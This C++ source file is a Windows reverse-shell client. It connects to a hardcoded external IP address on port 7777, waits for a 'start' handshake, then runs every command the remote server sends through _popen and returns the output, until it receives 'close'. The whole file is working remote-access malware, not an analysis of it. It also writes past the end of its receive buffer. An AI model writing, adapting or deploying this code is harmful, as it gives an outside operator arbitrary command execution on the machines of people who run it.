#include <chrono>
#include <cstring> 
#include <thread>
#define ASIO_STANDALONE
#ifdef _WIN32
#define _WIN32_WINNT 0X0A00
#endif
#include <asio.hpp>
#include <asio/ts/buffer.hpp>
#include <asio/ts/internet.hpp>
#include <vector>
const std::string ipaddr = "27.34.65.57";
void makeregistery();
void sleep();
bool isconnection = false;
using namespace std::chrono_literals;
short registery =0 ;

int main() {
    asio::error_code ec;
    asio::io_context context;
    asio::ip::tcp::endpoint endpoint(asio::ip::make_address(ipaddr, ec), 7777);
    asio::ip::tcp::socket socket(context);
    socket.connect(endpoint, ec);

    if (!ec && socket.is_open()) {
        std::string request = "cmdline";
        socket.write_some(asio::buffer(request.data(), request.size()), ec);
        sleep(); // Wait for the server to process the request

        char amp[55];
        size_t bytes = socket.read_some(asio::buffer(amp, sizeof(amp)), ec);
        if (bytes > 0 && std::string(amp, bytes) == "start") {
            isconnection = true;
        }
    } else {
        makeregistery();
        return 1; // Exit with an error code
    }

    while (isconnection) {
        sleep(); // Optionally wait between iterations
        size_t bytes = socket.available();
        if (bytes > 0) {
            char cmd[1024];
            bytes = socket.read_some(asio::buffer(cmd, sizeof(cmd)), ec);
            if (bytes > 0) {
                cmd[bytes] = '\0'; // Null-terminate the received data
                if (std::strcmp(cmd, "close") == 0) {
                    isconnection = false;
                } else {
                    FILE* hello = _popen(cmd, "r");
                    if (hello) {
                        std::string result;
                        char buffer[1064];
                        while (fgets(buffer, sizeof(buffer), hello) != nullptr) {
                            result += buffer;
                        }
                        _pclose(hello);
                        socket.write_some(asio::buffer(result.data(), result.size()), ec);
                    } else {
                        // Handle command execution error
                    }
                }
            }
        }
    }

    socket.close(); // Close the socket when done
    return 0;
}

void sleep() {
    std::this_thread::sleep_for(200ms);
}
void makeregistery(){
    registery++;
}